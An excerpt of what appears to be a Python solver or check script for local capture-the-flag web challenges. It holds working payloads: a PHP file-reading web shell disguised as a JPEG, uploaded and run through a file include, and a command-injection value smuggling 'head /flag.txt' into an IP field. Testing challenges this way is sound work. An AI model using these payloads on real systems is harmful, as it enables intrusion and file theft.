...
HOST = "127.0.0.1"
CHALLENGES = {
    "python-exec": ROOT / "challenges/intro/web-demo",
    "upload-include": ROOT / "challenges/final/web/web-hard-upload-include",
    "xxe-docx": ROOT / "challenges/final/web/web-bonus-xxe-docx",
    "method-head": ROOT / "challenges/final/web/web-easy-method-head",
    "command-injection": ROOT / "challenges/final/web/web-medium-command-injection",
}
...
def check_python_exec() -> None:
    flag = expected_flag("python-exec")
...
def check_upload_include() -> None:
    flag = expected_flag("upload-include")
    payload = b"<?php echo file_get_contents('/flag.txt'); ?>"
    body, content_type = multipart({}, "payload.jpg", payload, "image/jpeg")
    request(
        f"http://{HOST}:5102/upload.php",
        data=body,
        headers={"Content-Type": content_type},
    ).read()
    result = request(f"http://{HOST}:5102/?page=uploads/payload.jpg").read().decode()
    assert flag in result


def check_xxe_docx() -> None:
    flag = expected_flag("xxe-docx")
...
def check_method_head() -> None:
    flag = expected_flag("method-head")
    response = request(f"http://{HOST}:5104/admin", method="HEAD")
    assert response.headers.get("X-Flag") == flag


def check_command_injection() -> None:
    flag = expected_flag("command-injection")
    data = urllib.parse.urlencode({"ip": "127.0.0.1\nhead /flag.txt"}).encode()
    body = request(f"http://{HOST}:5105/", data=data).read().decode()
    assert flag in body
...
def main() -> int:
    checks = (
        ...
        ("upload-include", check_upload_include),
        ("xxe-docx", check_xxe_docx),
        ("method-head", check_method_head),
